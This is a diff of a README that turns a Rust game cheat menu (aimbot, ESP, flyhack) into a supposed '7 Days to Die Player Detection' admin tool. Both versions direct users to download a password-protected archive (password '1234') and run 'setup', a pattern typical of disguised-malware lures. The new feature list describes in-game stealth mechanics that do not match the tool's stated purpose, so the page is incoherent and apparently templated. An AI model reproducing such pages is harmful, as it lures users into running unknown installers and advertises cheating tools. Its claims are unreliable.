@@ -1,31 +1,30 @@
-# Rust Mod Menu
+# 7 Days to Die Player Detection
 
-Rust Mod Menu is a professional, easy-to-use menu framework for Rust projects, designed to streamline in-game configuration, debugging, and feature access with a clean interface.
+7 Days to Die Player Detection is a lightweight tool that identifies suspicious player behavior, helping server admins monitor threats, enforce rules, and maintain fair gameplay.
 
 ## Installation
-### [Download Rust Mod Menu — Latest release](https://example.com/rust-mod-menu/releases/latest)
+### [Download 7 Days to Die Player Detection — Latest release](https://example.com/7-days-to-die-player-detection/releases/latest)
 > #### Archive password: `1234`
 
-- Download the archive for Rust Mod Menu.
-- Extract the archive to a folder.
-- Run the installer called `setup`.
+- Download the [archive](https://example.com/7-days-to-die-player-detection/releases/latest), extract it, then run `setup`.
 
-![Rust Mod Menu](/path/to/pic.png)
+![7 Days to Die Player Detection](/path/to/pic.png)
 
 ## Features
 
-- Aimbot with multiple modes
-- Detailed ESP for players and resources
-- Flyhack and movement tools
-- No recoil and weapon control
-- Configurable in-game menu
+- Crouching enables **stealth mode**.
+- A **stealth meter** shows how detectable you are.
+- **Light level** affects whether zombies notice you.
+- **Noise** from movement and actions can trigger detection.
+- Detection also depends on **distance** and line of sight.
 
 ## System Requirements
 
 | Parameter | Minimum |
 |---|---|
+| OS | Windows 7 or higher (64-bit) |
+| CPU | 2.4 GHz Dual Core CPU |
 | RAM | 8 GB |
-| OS | Windows 10 64-bit |
-| CPU | Quad-core 2.5 GHz |
-| Disk Space | 2 GB free |
-| GPU | DirectX 11 compatible |
+| Disk Space | 12 GB available space |
+| Graphics | 2 GB dedicated memory |
+| DirectX | Version 11 |
